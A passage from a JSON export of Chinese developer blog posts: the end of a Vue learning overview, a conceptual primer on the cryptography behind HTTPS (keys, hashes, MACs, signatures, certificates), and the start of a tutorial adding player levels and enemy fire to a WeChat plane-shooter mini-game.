就是掌握 vue ，哈哈\u003c/i\u003e\u003c/p\u003e\n\u003cp\u003eVue ，React ，Angular 三大主流框架，最后我选择学习 Vue ，接触过 React ，自己感觉学习曲线有些陡峭，进而我选择了学习 Vue ，他的学习曲线平稳很多；不管选择什么框架，除了对基础的知识有一定的了解掌握，还应该对 ES6 有一定的了解；\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/2/160b6ce459a28144?w=2238\u0026amp;h=1540\u0026amp;f=png\u0026amp;s=396095\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e这就是我脑海中的 Vue 知识体系；\u003c/p\u003e\n\u003cp\u003e一句话概况了 Vue  \u003cb\u003e通过尽可能简单的 API 实现响应的数据绑定和组合的视图组件\u003c/b\u003e;\u003c/p\u003e\n\u003ch2 style=\"color:rgb(230,3,135);\"\u003e Vue 的创建\u003c/h2\u003e\n一个简单的 Vue 实例只需要四步即可\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/2/160b6ce8b0cd7561?w=684\u0026amp;h=329\u0026amp;f=png\u0026amp;s=59870\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e我们的学习目的肯定不止于创建简单的 Vue 实例；而是用它去实现更加多变的功能需求；那我们需要进一步去学习 Vue-router 和 Vuex 以及 Vue-cli；\u003c/p\u003e\n\u003cp\u003e先说说基础的 Vue 吧，在创建了一个简单 Vue 实例之后，我们是否还能在实例中添加更加完善的数据选项，去完成我们多变的功能需求；答案是肯定能的；\u003c/p\u003e\n\u003cp style=\"color:rgb(230,3,135);\"\u003e 指令\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/2/160b6d01006d77e2?w=837\u0026amp;h=375\u0026amp;f=png\u0026amp;s=29815\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\n\u003ci\u003e下面是我用上述指令写的一个小案例，刚好所有的指令都上了用场\u003c/i\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/2/160b6d0bb86b9466?w=600\u0026amp;h=321\u0026amp;f=gif\u0026amp;s=580480\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://github.com/sunseekers/Vue/blob/master/dome1.html\"\u003e详细请看 demo 源码\u003c/a\u003e\u003c/p\u003e\n\u003cp style=\"color:rgb(230,3,135);\"\u003e 自定义指令\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/2/160b6d26a8fdad52?w=1656\u0026amp;h=1300\u0026amp;f=png\u0026amp;s=188292\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e在代码的实例中\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/2/160b6d2db4d44c30?w=695\u0026amp;h=604\u0026amp;f=png\u0026amp;s=25205\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\n\u003ca target=\"_blank\" href=\"https://github.com/sunseekers/Vue/blob/master/directive.html\"\u003e查看代码源\u003c/a\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp style=\"color:rgb(230,3,135);\"\u003e Vue API\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/2/160b6d4518bdf686?w=1656\u0026amp;h=717\u0026amp;f=png\u0026amp;s=120175\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp style=\"color:rgb(230,3,135);\"\u003e Vue 常用选项\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/2/160b6cee7c28ad9f?w=456\u0026amp;h=522\u0026amp;f=png\u0026amp;s=17159\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e这就是我在学习 Vue 的时候，在 Vue 实例中添加的比较多的；\u003ci\u003e directives 和 components 在 Vue 实例中为创建的 \u003cb\u003e局部\u003c/b\u003e 自定义指令和注册组件，Vue.directive() 和 Vue.component() 则是注册全局\u003c/i\u003e\u003c/p\u003e\n\u003cp style=\"color:rgb(230,3,135);\"\u003e Vue 组件\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/2/160b6d4e3bf96776?w=523\u0026amp;h=257\u0026amp;f=png\u0026amp;s=9754\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp style=\"color:rgb(230,3,135);\"\u003e 生命周期钩子\u003c/p\u003e\n每个 Vue 实例在被创建之前都要经过一系列的初始化过程。例如需要设置数据监听、编译模板、挂载实例到 DOM、在数据变化时更新 DOM 等。同时在这个过程中也会运行一些叫做生命周期钩子的函数，给予用户机会在一些特定的场景下添加他们自己的代码。\n\u003cp\u003e在 QQ 群里看到一张生命周期图，我觉得写的特别好,感谢总结这张图的朋友\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/2/160b6d545e5aefa2?w=1200\u0026amp;h=2800\u0026amp;f=png\u0026amp;s=130323\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\n配合着实例代码效果更佳\u003ca target=\"_blank\" href=\"https://github.com/sunseekers/Vue/blob/master/mounted.html\"\u003e查看代码源\u003c/a\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/2/160b6d5fb581c3c5?w=995\u0026amp;h=573\u0026amp;f=png\u0026amp;s=62905\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\n生命周期钩子的函数简单说就是八个函数\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/2/160b6d6cbfd637c6?w=1994\u0026amp;h=486\u0026amp;f=png\u0026amp;s=104721\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch2 style=\"color:rgb(230,3,135);\"\u003e 如何让 Vue 书写更佳优美？\u003c/h2\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/2/160b6d64238b93b5?w=1416\u0026amp;h=2049\u0026amp;f=png\u0026amp;s=333121\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\n\u003ca target=\"_blank\" href=\"https://cn.vuejs.org/v2/style-guide/\"\u003e详细 style-guide 请参看官网\u003c/a\u003e\n进一步学习请参考\u003ca target=\"_blank\" href=\"https://cn.vuejs.org/v2/guide/installation.html\"\u003e官方文档\u003c/a\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e部分资源来自网络\u003c/p\u003e\n","buildTime":"1514979830.5939","__v":0}
{"_id":{"$oid":"5a4b774a85b30d097483e98f"},"id":"58a8f3295c497d005fbd58b1","author":{"$oid":"5a4b774a85b30d097483e987"},"imageCache":[{"imageUrlArray":["https://dn-mhke0kuv.qbox.me/44ab13849be856577300.jpg","https://dn-mhke0kuv.qbox.me/aa15972adf661565e69f.jpg","https://dn-mhke0kuv.qbox.me/5a3e6640a3c70ac79d5a.png","https://dn-mhke0kuv.qbox.me/c933275319887635ff6d.png","https://dn-mhke0kuv.qbox.me/c1f76fa88cb781250982.jpg","https://dn-mhke0kuv.qbox.me/a87269f5f2517d153bee.png","https://dn-mhke0kuv.qbox.me/8a4596304d1653886903.png","https://dn-mhke0kuv.qbox.me/96a8a4770026407d5dfd.jpg"],"screenShot":"https://dn-mhke0kuv.qbox.me/bfd4236c885b67d299b1.jpg"}],"title":"HTTPS 为什么更安全，先看这些","meta":{"likeCount":0},"tag":["前端","后端","HTTP","HTTPS"],"comment":[],"shortContent":"HTTPS 是建立在密码学基础之上的一种安全通信协议，严格来说是基于 HTTP 协议和 SSL/TLS 的组合。理解 HTTPS 之前有必要弄清楚一些密码学的相关基础概念，比如：明文、密文、密码、密钥、对称加密、非对称加密、信息摘要、数字签名、数字证书。接下来我会逐个解释这些术…","content":"\u003cp\u003eHTTPS 是建立在密码学基础之上的一种安全通信协议，严格来说是基于 HTTP 协议和 SSL/TLS 的组合。理解 HTTPS 之前有必要弄清楚一些密码学的相关基础概念，比如：明文、密文、密码、密钥、对称加密、非对称加密、信息摘要、数字签名、数字证书。接下来我会逐个解释这些术语，文章里面提到的『数据』、『消息』都是同一个概念，表示用户之间通信的内容载体，此外文章中提到了以下几个角色：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eAlice：消息发送者\u003c/li\u003e\n\u003cli\u003eBob：消息接收者\u003c/li\u003e\n\u003cli\u003eAttacker：中间攻击者\u003c/li\u003e\n\u003cli\u003eTrent：第三方认证机构\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"-\"\u003e密码\u003c/h3\u003e\n\u003cp\u003e密码学中的“密码”术语与网站登录时用的密码（password）是不一样的概念，password 翻译过来其实是“口令”，它是用于认证用途的一组文本字符串。\u003c/p\u003e\n\u003cp\u003e而密码学中的密码（cipher）是一套算法(algorithm)，这套算法用于对消息进行加密和解密，从明文到密文的过程称之为加密，密文反过来生成明文称之为解密，加密算法与解密算法合在一起称为\u003cstrong\u003e密码算法\u003c/strong\u003e。\u003c/p\u003e\n\u003ch3 id=\"-\"\u003e密钥\u003c/h3\u003e\n\u003cp\u003e密钥（key）是在使用密码算法过程中输入的一段参数。同一个明文在相同的密码算法和不同的密钥计算下会产生不同的密文。很多知名的密码算法都是公开的，密钥才是决定密文是否安全的重要参数，通常密钥越长，破解的难度越大，比如一个8位的密钥最多有256种情况，使用穷举法，能非常轻易的破解。根据密钥的使用方法，密码可分为对称加密和公钥加密。\u003c/p\u003e\n\u003ch3 id=\"-\"\u003e对称加密\u003c/h3\u003e\n\u003cp\u003e对称密钥（Symmetric-key algorithm）又称为共享密钥加密，加密和解密使用相同的密钥。常见的对称加密算法有DES、3DES、AES、RC5、RC6。对称密钥的优点是计算速度快，但是它有缺点，接收者需要发送者告知密钥才能解密，因此密钥如何安全的发送给接收者成为了一个问题。\u003c/p\u003e\n\u003cp\u003e\u003cfigure\u003e\u003cimg src=\"https://dn-mhke0kuv.qbox.me/44ab13849be856577300.jpg\" atr=\"\" style=\"\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003c/p\u003e\n\u003cp\u003eAlice 给 Bob 发送数据时，把数据用对称加密后发送给 Bob，发送过程中由于对数据进行了加密，因此即使有人窃取了数据也没法破解，因为它不知道密钥是什么。但是同样的问题是 Bob 收到数据后也一筹莫展，因为它也不知道密钥是什么，那么 Alice 是不是可以把数据和密钥一同发给 Bob 呢。当然不行，一旦把密钥和密钥一起发送的话，那就跟发送明文没什么区别了，因为一旦有人把密钥和数据同时获取了，密文就破解了。所以对称加密的密钥配是个问题。如何解决呢，公钥加密是一个办法。\u003c/p\u003e\n\u003ch3 id=\"-\"\u003e公钥加密\u003c/h3\u003e\n\u003cp\u003e公开密钥加密（public-key cryptography）简称公钥加密，这套密码算法包含配对的密钥对，分为加密密钥和解密密钥。发送者用加密密钥进行加密，接收者用解密密钥进行解密。加密密钥是公开的，任何人都可以获取，因此加密密钥又称为公钥（public key），解密密钥不能公开，只能自己使用，因此它又称为私钥（private key）。常见的公钥加密算法有 RSA。\u003c/p\u003e\n\u003cp\u003e还是以Alice 给 Bob 发送数据为例，公钥加密算法由接收者 Bob 发起\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eBob 生成公钥和私钥对，私钥自己保存，不能透露给任何人。\u003c/li\u003e\n\u003cli\u003eBob 把公钥发送给 Alice，发送过程中即使被人窃取也没关系\u003c/li\u003e\n\u003cli\u003eAlice 用公钥把数据进行加密，并发送给 Bob，发送过程中被人窃取了同样没关系，因为没有配对的私钥进行解密是没法破解的\u003c/li\u003e\n\u003cli\u003eBob 用配对的私钥解密。\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e\u003cfigure\u003e\u003cimg src=\"https://dn-mhke0kuv.qbox.me/aa15972adf661565e69f.jpg\" atr=\"\" style=\"\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003c/p\u003e\n\u003cp\u003e虽然公钥加密解决了密钥配送的问题，但是你没法确认公钥是不是合法的，Bob 发送的公钥你不能肯定真的是 Bob 发的，因为也有可能在 Bob 把公钥发送给 Alice 的过程中出现中间人攻击，把真实的公钥掉包替换。而对于 Alice 来说完全不知。还有一个缺点是它的运行速度比对称加密慢很多。\u003c/p\u003e\n\u003ch3 id=\"-\"\u003e消息摘要\u003c/h3\u003e\n\u003cp\u003e消息摘要（message digest）函数是一种用于判断数据完整性的算法，也称为散列函数或哈希函数，函数返回的值叫散列值，散列值又称为消息摘要或者指纹（fingerprint）。这种算法是一个不可逆的算法，因此你没法通过消息摘要反向推倒出消息是什么。所以它也称为单向散列函数。下载软件时如何确定是官方提供的完整版呢，如果有中间人在软件里面嵌入了病毒，你也不得而知。所以我们可以使用散列函数对消息进行运算，生成散列值，通常软件提供方会同时提供软件的下载地址和软件的散列值，用户把软件下载后在本地用相同的散列算法计算出散列值，与官方提供的散列值对比，如果相同，说明该软件是完成的，否则就是被人修改过了。常用的散列算法有MD5、SHA。\u003c/p\u003e\n\u003cp\u003e\u003cfigure\u003e\u003cimg src=\"https://dn-mhke0kuv.qbox.me/5a3e6640a3c70ac79d5a.png\" atr=\"\" style=\"\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003c/p\u003e\n\u003cp\u003e下载 Eclipse 时，官方网站同时提供了软件地址和消息摘要\u003c/p\u003e\n\u003cp\u003e\u003cfigure\u003e\u003cimg src=\"https://dn-mhke0kuv.qbox.me/c933275319887635ff6d.png\" atr=\"\" style=\"\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003c/p\u003e\n\u003cp\u003e散列函数可以保证数据的完整性，识别出数据是否被篡改，但它并不能识别出数据是不是伪装的，因为中间人可以把数据和消息摘要同时替换，数据虽然是完整的，但真实数据被掉包了，接收者收到的并不是发送者发的，而是中间人的。消息认证是解决数据真实性的办法。认证使用的技术有消息认证码和数字签名。\u003c/p\u003e\n\u003ch3 id=\"-\"\u003e消息认证码\u003c/h3\u003e\n\u003cp\u003e消息认证码（message authentication code）是一种可以确认消息完整性并进行认证（消息认证是指确认消息来自正确的发送者）的技术，简称 MAC。消息认证码可以简单理解为一种与密钥相关的单向散列函数。\u003c/p\u003e\n\u003cp\u003e\u003cfigure\u003e\u003cimg src=\"https://dn-mhke0kuv.qbox.me/c1f76fa88cb781250982.jpg\" atr=\"\" style=\"\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003c/p\u003e\n\u003cp\u003eAlice 给 Bob 发送消息前，先把共享密钥（key）发送给 Bob，Alice 把消息计算出 MAC 值，连同消息一起发送给 Bob，Bob 接收到消息和 MAC 值后，与本地计算得到 MAC 值对比，如果两者相同，就说明消息是完整的，而且可以确定是 Alice 发送的，没有中间人伪造。不过，消息认证码同样会遇到对称加密的密钥配送问题，因此解决密钥配送问题还是要采用公钥加密的方式。\u003c/p\u003e\n\u003cp\u003e此外，消息认证码还有一个无法解决的问题，Bob 虽然可以识别出消息的篡改和伪装，但是 Alice 可以否认说：“我没发消息，应该是 Bob 的密钥被 Attacker 盗取了，这是 Attacker 发的吧”。Alice 这么说你还真没什么可以反驳的，那么如何防止 Alice 不承认呢，数字签名可以实现。\u003c/p\u003e\n\u003ch3 id=\"-\"\u003e数字签名\u003c/h3\u003e\n\u003cp\u003eAlice 发邮件找 Bob 借1万钱，因为邮件可以被人篡改（改成10万），也可以被伪造（Alice 根本就没发邮件，而是 Attacker 伪造 Alice 在发邮件），Alice 借了钱之后还可以不承认（不是我借的，我没有签名啊）。\u003c/p\u003e\n\u003cp\u003e消息认证码可以解决篡改和伪造的问题，Alice 不承认自己借了钱时，Bob 去找第三方机构做公正，即使这样，公正方也没法判断 Alice 有没有真的借钱，因为他们俩共享了密钥，也就是说两个都可以计算出正确的 MAC 值，Bob 说：“明明你发的消息和 MAC 值和我自己生成的 MAC 值一样，肯定是你发的消息”，Alice 说：“你把密钥透露给了其他人，是他发的邮件，你找他去吧”。Alice 矢口否认。\u003c/p\u003e\n\u003cp\u003e数字签名（Digital Signature）就可以解决否认的问题，发送消息时，Alice 和 Bob 使用不同的密钥，把公钥加密算法反过来使用，发送者 Alice 使用私钥对消息进行签名，而且只能是拥有私钥的 Alice 可以对消息签名，Bob 用配对的公钥去验证签名，第三方机构也可以用公钥验证签名，如果验证通过，说明消息一定是 Alice 发送的，抵赖也不行，因为你只有 Alice 可以生成签名。这就防止了否认的问题。\u003c/p\u003e\n\u003cp\u003e\u003cfigure\u003e\u003cimg src=\"https://dn-mhke0kuv.qbox.me/a87269f5f2517d153bee.png\" atr=\"\" style=\"\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003c/p\u003e\n\u003cp\u003e它的流程是:\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e第一步\u003c/strong\u003e：发送者 Alice 把消息哈希函数处理生成消息摘要，摘要信息使用私钥加密之后生成签名，连同消息一起发送给接收者 Bob。    \u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e第二步\u003c/strong\u003e：数据经过网络传输，Bob收到数据后，把签名和消息分别提取出来。\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e第三步\u003c/strong\u003e：对签名进行验证，验证的过程是先把消息提取出来做同样的Hash处理，得到消息摘要，再与 Alice 传过来的签名用公钥解密，如果两者相等，就表示签名验证成功，否则验证失败，表示不是 Alice发的。\u003c/p\u003e\n\u003ch3 id=\"-\"\u003e公钥证书\u003c/h3\u003e\n\u003cp\u003e公钥密码在数字签名技术里面扮演举足轻重的角色，但是如何保证公钥是合法的呢，如果是遭到中间人攻击，掉包怎么办？这个时候公钥就应该交给一个第三方权威机构来管理，这个机构就是认证机构（Certification Authority）CA，CA 把用户的姓名、组织、邮箱地址等个人信息收集起来，还有此人的公钥，并由 CA 提供数字签名生成公钥证书（Public-Key Certificate）PKC，简称证书。\u003c/p\u003e\n\u003cp\u003e\u003cfigure\u003e\u003cimg src=\"https://dn-mhke0kuv.qbox.me/8a4596304d1653886903.png\" atr=\"\" style=\"\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003c/p\u003e\n\u003cp\u003eAlice 向 Bob 发送消息时，是通过 Bob 提供的公钥加密后的数据，而 Alice 获取的公钥并不是由 Bob 直接给的，而是由委托一个受信任的第三方机构给的。\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eBob 生成密钥对，私钥自己保管，公钥交给认证机构 Trent。\u003c/li\u003e\n\u003cli\u003eTrent 经过一系列严格的检查确认公钥是 Bob 本人的\u003c/li\u003e\n\u003cli\u003eTrent 事先也生成自己的一套密钥对，用自己的私钥对 Bob 的公钥进行数字签名并生成数字证书。证书中包含了 Bob 的公钥。公钥在这里是不需要加密的，因为任何人获取 Bob 的公钥都没事，只要确定是 Bob 的公钥就行。\u003c/li\u003e\n\u003cli\u003eAlice 获取 Trent 提供的证书。\u003c/li\u003e\n\u003cli\u003eAlice 用 Trent 提供的公钥对证书进行签名验证，签名验证成功就表示证书中的公钥是 Bob 的。\u003c/li\u003e\n\u003cli\u003e于是 Alice 就可以用 Bob 提供的公钥对消息加密后发送给 Bob。\u003c/li\u003e\n\u003cli\u003eBob 收到密文后，用与之配对的私钥进行解密。\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e至此，一套比较完善的数据传输方案就完成了。HTTPS（SSL/TLS）就是在这样一套流程基础之上建立起来的。\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e本文首发于公众号『一个程序员的微站』（id:VTtalk），分享 Python 等技术干货和有温度的内容，欢迎关注\u003cbr\u003e博客地址：\u003ca href=\"https://foofish.net/https-story-1.html\" target=\"_blank\"\u003ehttps://foofish.net/https-story-1.html\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003cfigure\u003e\u003cimg src=\"https://dn-mhke0kuv.qbox.me/96a8a4770026407d5dfd.jpg\" atr=\"一个程序员的微站\" style=\"\"\u003e\u003cfigcaption\u003e一个程序员的微站\u003c/figcaption\u003e\u003c/figure\u003e\u003c/p\u003e\n","buildTime":"1514888142.7256","__v":0}
{"_id":{"$oid":"5a4cc1fa37991328ecbc7457"},"id":"5a4b83996fb9a0451c3ac589","author":{"$oid":"5a4cc1f937991328ecbc744a"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2018/1/2/160b6fa88d105d6d?w=258\u0026h=258\u0026f=jpeg\u0026s=15517"],"screenShot":null}],"title":"微信小游戏体验之打飞机改造计划","meta":{"likeCount":0},"tag":["游戏","微信","前端","设计"],"comment":[],"shortContent":"微信小游戏推出已有几天了，这个功能对小程序和小游戏的推动影响不用多说，大家赶紧摩拳擦掌往上撸就可以了。关于如何开发官方文档已经说明了，这篇则是对官方的打飞机demo一些小改造。 根据官方文档说明，目前不提供公开注册。因此目前只能使用无AppID模式进行体验 为了让HTML5游戏…","content":"\u003cp\u003e微信小游戏推出已有几天了，这个功能对小程序和小游戏的推动影响不用多说，大家赶紧摩拳擦掌往上撸就可以了。关于如何开发官方文档已经说明了，这篇则是对官方的\u003ccode\u003e打飞机\u003c/code\u003edemo一些小改造。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e开发预备式\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003e下载最新版本的\u003ccode\u003e微信开发者工具\u003c/code\u003e(v1.02.1712280)\u003c/li\u003e\n\u003cli\u003e根据官方文档说明，\u003cstrong\u003e目前不提供公开注册\u003c/strong\u003e。因此目前只能使用\u003cstrong\u003e无AppID\u003c/strong\u003e模式进行体验\u003c/li\u003e\n\u003cli\u003e为了让\u003ccode\u003eHTML5\u003c/code\u003e游戏轻松接入，官方提供了\u003ccode\u003eAdapter\u003c/code\u003e。这个的作用就是提供\u003ccode\u003eHTML5\u003c/code\u003e写法和\u003ccode\u003ewx\u003c/code\u003e写法的全局转换层。\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 class=\"heading\"\u003e打飞机小游戏\u003c/h3\u003e\n\u003cp\u003e使用\u003ccode\u003e无AppID\u003c/code\u003e模式创建一个微信小游戏后可以看到官方demo，其中入口文件和配置文件：\u003ccode\u003egame.js\u003c/code\u003e和\u003ccode\u003egame.json\u003c/code\u003e。\u003ccode\u003egame.js\u003c/code\u003e引入并初始化包含整个\u003ccode\u003e打飞机\u003c/code\u003e的游戏场景、参与者（玩家飞机和敌方飞机）、游戏逻辑的主函数的\u003ccode\u003emain.js\u003c/code\u003e。在\u003ccode\u003emain.js\u003c/code\u003e中我们可以发现由于\u003ccode\u003eAdapter\u003c/code\u003e的存在，这里的代码和我们平常的代码写法没什么差异了。游戏的主逻辑如下图：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"image\" src=\"https://user-gold-cdn.xitu.io/2018/1/2/160b6f94e363b702?w=606\u0026amp;h=898\u0026amp;f=png\u0026amp;s=38855\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e在loop中，玩家每隔20帧射一次，每隔60帧生成新的敌机。每帧检查玩家和敌机是否死亡，玩家死亡游戏结束，敌机死亡分数+1。只有玩家可以射击，且射击方式固定，通过躲避敌机生存。接下来我们针对这些进行改造，提升游戏的可玩性和挑战性。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e玩家升级计划\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003e玩家初始等级为1，玩家可通过击杀敌机升级，每击落30敌机升级一次\u003c/li\u003e\n\u003cli\u003e玩家每升级一次，增加一个射击口\u003c/li\u003e\n\u003cli\u003e玩家最多升级两次\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e首先用编辑器打开\u003ccode\u003eplayer/index.js\u003c/code\u003e，将等级逻辑加入到玩家的类中。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e default class Player extends Sprite {\n  \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003econstructor\u003c/span\u003e\u003c/span\u003e() {\n    super(PLAYER_IMG_SRC, PLAYER_WIDTH, PLAYER_HEIGHT)\n\n    // 玩家默认处于屏幕底部居中位置\n    this.x = screenWidth / 2 - this.width / 2\n    this.y = screenHeight - this.height - 30\n\n    // 用于在手指移动的时候标识手指是否已经在飞机上了\n    this.touched = \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e\n\n    this.bullets = []\n\n    // 初始化事件监听\n    this.initEvent()\n\n    this.playerLevel = 1;\n  }\n\n  get \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003elevel\u003c/span\u003e\u003c/span\u003e () {\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e this.playerLevel;\n  }\n  \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e level (level) {\n    this.playerLevel = Math.min(level, 3);\n  }\n\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e接下来在\u003ccode\u003emain.js\u003c/code\u003e的\u003ccode\u003eupdate\u003c/code\u003e函数加入升级逻辑。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e// 其他代码...\n\n    \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003eupdate\u003c/span\u003e\u003c/span\u003e() {\n        this.bg.update();\n\n        databus.bullets.concat(databus.enemys).forEach(item =\u0026gt; {\n            item.update();\n        });\n\n        this.enemyGenerate();\n\n        this.player.level = Math.max(1, Math.ceil(databus.score / 30));\n\n        this.collisionDetection();\n    }\n\n// 其他代码...\n\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e好的，到此玩家已经可以正常升级了。那么该给予玩家奖励品了。在\u003ccode\u003eplayer/index.js\u003c/code\u003e的\u003ccode\u003eshoot\u003c/code\u003e函数中我们修改射击的逻辑。玩家1级时只有中间的射击口，2级有左边和中间的射击口，3级有左中右三个射击口。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e// ...其他代码\n\n    /**\n     * 玩家射击操作\n     * 射击时机由外部决定\n     */\n    \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003eshoot\u003c/span\u003e\u003c/span\u003e() {\n\n\n      \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e(\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e i = 0; i \u0026lt; this.level; i++) {\n        const bullet = databus.pool.getItemByClass(\u003cspan class=\"hljs-string\"\u003e'bullet'\u003c/span\u003e, Bullet);\n        const middle = this.x + this.width / 2 - bullet.width / 2;\n        const x = !i ? middle : (i % 2 === 0 ? middle + 30 : middle - 30);\n        bullet.init(\n          x,\n          this.y - 10,\n          10\n        )\n\n        databus.bullets.push(bullet)\n      }\n    }\n\n// ...其他代码\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e武器的最终形态如图, 这时候的玩家已经可以为所欲为了\u0026lt;_\u0026lt;，实际上都不需要躲避了。。。：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"image\" src=\"https://user-gold-cdn.xitu.io/2018/1/2/160b6fa343c2f459?w=750\u0026amp;h=1338\u0026amp;f=png\u0026amp;s=1124694\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e敌人的反击号角\u003c/h3\u003e\n\u003cp\u003e为了对抗愚昧的玩家，不让他们为所欲为，最后没兴趣玩下去～～，敌机装备武器，反击开始。\u003c/p\u003e\n\u003cp\u003e首先敌机的子弹是向下，所以复制一份\u003ccode\u003eimages/bullet.png\u003c/code\u003e，并颠倒保存为\u003ccode\u003eimages/bullet-down.png\u003c/code\u003e, 然后我们重用\u003ccode\u003ejs/player/bullet.js\u003c/code\u003e，在构造函数处增加敌机的子弹配置项，并修改敌人子弹更新逻辑。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs 